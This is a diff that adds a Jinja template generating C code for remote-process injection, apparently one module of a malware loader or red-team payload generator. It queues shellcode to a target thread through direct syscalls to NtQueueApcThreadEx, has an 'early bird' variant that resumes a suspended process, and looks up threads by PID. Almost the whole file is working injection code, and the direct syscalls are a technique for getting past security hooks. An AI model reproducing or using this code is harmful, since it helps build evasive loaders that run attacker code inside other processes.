@@ -1,0 +1,44 @@
+{% from "macros.jinja" import syscall_call, createThreadStub with context %}
+
+{% if section == "globals" %}
+    {% include "lib/syscalls.jinja" %}
+
+    {% if not link.early_bird %}
+        {% include "lib/find_thread.cpp" %}
+    {% endif %}
+
+    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
+    typedef enum _QUEUE_USER_APC_FLAGS {
+      QUEUE_USER_APC_FLAGS_NONE,
+      QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
+      QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
+    } QUEUE_USER_APC_FLAGS;
+
+    NTSTATUS inject(HANDLE hThread, void *pRemoteCode){
+        NTSTATUS status;
+        DWORD SyscallId = 0;
+
+        {% if early_bird %}
+            {{ syscall_call("NtQueueApcThreadEx", "hThread, QUEUE_USER_APC_FLAGS_NONE, pRemoteCode, 0, 0, 0") }}
+        {% else %}
+            {{ syscall_call("NtQueueApcThreadEx", "hThread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, pRemoteCode, 0, 0, 0") }}
+        {% endif %}
+        return status;
+    }
+{% else %}
+    {% if early_bird %}
+        NTSTATUS status;
+        DWORD SyscallId = 0;
+
+        inject(pi.hThread, mem);
+        {{ syscall_call("NtResumeThread", "pi.hThread, NULL") }}
+    {% else %}
+        {# PID left from alloc_basic_remote section #}
+        HANDLE hThread = FindThread(pid);
+        if (hThread == NULL) {
+            printf("[-] Failed to aquire thread handle\n");
+            return 0;
+        }
+        inject(hThread, mem);
+    {% endif %}
+{% endif %}
